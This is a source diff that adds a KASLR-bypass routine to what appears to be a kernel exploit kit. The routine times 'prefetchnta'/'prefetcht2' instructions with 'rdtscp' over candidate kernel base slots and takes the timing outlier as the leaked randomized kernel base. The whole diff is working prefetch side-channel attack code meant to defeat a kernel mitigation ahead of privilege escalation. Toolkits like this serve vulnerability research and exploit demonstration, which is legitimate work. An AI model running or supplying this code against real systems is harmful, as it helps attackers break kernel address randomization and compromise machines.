@@ -12,8 +12,12 @@
 // See the License for the specific language governing permissions and
 // limitations under the License.
 
+#include <algorithm>
+#include <cassert>
+#include <limits>
 #include <sched.h>
 #include <stdint.h>
+#include <optional>
 #include <xdk/util/error.h>
 #include <xdk/util/pwn_utils.h>
 
@@ -41,4 +45,126 @@ void pin_cpu(int cpu) {
     CPU_SET(cpu, &set);
     if (sched_setaffinity(0, sizeof(set), &set))
         throw errno_error("sched_setaffinity failed");
+}
+
+// The lowest possible base: 0xFFFFFFFF80000000 + CONFIG_PHYSICAL_START
+const uint64_t KASLR_START = 0xFFFFFFFF81000000;
+
+// The highest possible base.
+const uint64_t KASLR_END = KASLR_START + 0x40000000;
+
+// The KASLR slot size; equal to CONFIG_PHYSICAL_ALIGN
+const uint64_t KASLR_SLOT_SIZE = 0x200000;
+
+// The number of prefetch measurements per candidate address.
+const int KASLR_NUM_MEASUREMENTS = 100;
+
+uint64_t compute_median(std::vector<uint64_t> v) {
+    assert(!v.empty() && "compute_median received an empty vector");
+    size_t n = v.size() / 2;
+    nth_element(v.begin(), v.begin() + n, v.end());
+    return v[n];
+}
+
+uint64_t abs_diff(uint64_t a, uint64_t b) {
+    return (a > b) ? (a - b) : (b - a);
+}
+
+std::optional<uint64_t> try_find_edge(const std::vector<uint64_t>& timings) {
+    uint64_t median = compute_median(timings);
+    uint64_t max_diff = 0;
+    for (size_t slot = 0; slot < timings.size(); slot++) {
+        uint64_t diff = abs_diff(timings[slot], median);
+        if (diff > max_diff) {
+            max_diff = diff;
+        }
+    }
+    uint64_t threshold = max_diff / 2;
+    for (size_t slot = 0; slot < timings.size(); slot++) {
+        uint64_t diff = abs_diff(timings[slot], median);
+        if (diff >= threshold) {
+            return slot;
+        }
+    }
+    return std::nullopt;
+}
+
+uint64_t slot_to_addr(size_t slot) {
+    return KASLR_START + (slot * KASLR_SLOT_SIZE);
+}
+
+inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
+    uint64_t a, d;
+    asm volatile(
+        "mfence\n\t"
+        "rdtscp\n\t"
+        "mov %%rdx, %0\n\t"
+        "mov %%rax, %1\n\t"
+        "xor %%rax, %%rax\n\t"
+        "lfence\n\t"
+        : "=r" (d), "=r" (a)
+        :
+        : "%rax", "%rbx", "%rcx", "%rdx");
+    a = (d << 32) | a;
+    return a;
+}
+
+inline __attribute__((always_inline)) uint64_t rdtsc_end() {
+    uint64_t a, d;
+    asm volatile(
+        "xor %%rax, %%rax\n\t"
+        "lfence\n\t"
+        "rdtscp\n\t"
+        "mov %%rdx, %0\n\t"
+        "mov %%rax, %1\n\t"
+        "mfence\n\t"
+        : "=r" (d), "=r" (a)
+        :
+        : "%rax", "%rbx", "%rcx", "%rdx");
+    a = (d << 32) | a;
+    return a;
+}
+
+inline __attribute__((always_inline)) void prefetch(uint64_t addr) {
+    asm volatile(
+        "prefetchnta (%0)\n\t"
+        "prefetcht2 (%0)\n\t"
+        :
+        : "r" (addr));
+}
+
+size_t sidechannel(uint64_t addr) {
+    size_t time = rdtsc_begin();
+    prefetch(addr);
+    size_t delta = rdtsc_end() - time;
+    return delta;
+}
+
+std::optional<uint64_t> try_leak_kaslr_base() {
+    size_t slots = (KASLR_END - KASLR_START) / KASLR_SLOT_SIZE;
+    std::vector<uint64_t> timings(slots, std::numeric_limits<uint64_t>::max());
+
+    for (int i = 0; i < KASLR_NUM_MEASUREMENTS; i++) {
+        for (size_t slot = 0; slot < slots; slot++) {
+            uint64_t addr = slot_to_addr(slot);
+            uint64_t timing = sidechannel(addr);
+            if (timing < timings[slot]) {
+                timings[slot] = timing;
+            }
+        }
+    }
+
+    std::optional<size_t> slot = try_find_edge(timings);
+    if (slot.has_value()) {
+        return slot_to_addr(*slot);
+    }
+    return std::nullopt;
+}
+
+uint64_t leak_kaslr_base() {
+    std::optional<uint64_t> base = try_leak_kaslr_base();
+    if (!base.has_value()) {
+        throw ExpKitError("Failed to leak KASLR base");
+    }
+    return *base;
 }
